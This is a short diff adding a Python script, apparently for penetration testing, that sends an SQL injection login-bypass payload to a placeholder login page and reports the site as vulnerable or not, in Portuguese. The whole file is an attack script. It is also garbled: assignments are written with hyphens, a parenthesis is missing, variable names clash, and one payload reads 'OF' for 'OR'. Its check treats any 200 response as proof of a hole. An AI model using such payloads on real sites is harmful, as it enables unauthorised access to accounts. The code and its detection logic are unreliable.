@@ -1,0 +1,9 @@
+<pentest_sql.py>
+import requests
+target='https://site.example.com/login'
+payload={'name':' "or " "=" ', 'pass':' " OF " "=" '}
+I = requests.post (target, data-payload, verify-False
+if i.status_code == 200:
+    print('site vulnerável')
+else:
+    print('site não vulnerável')
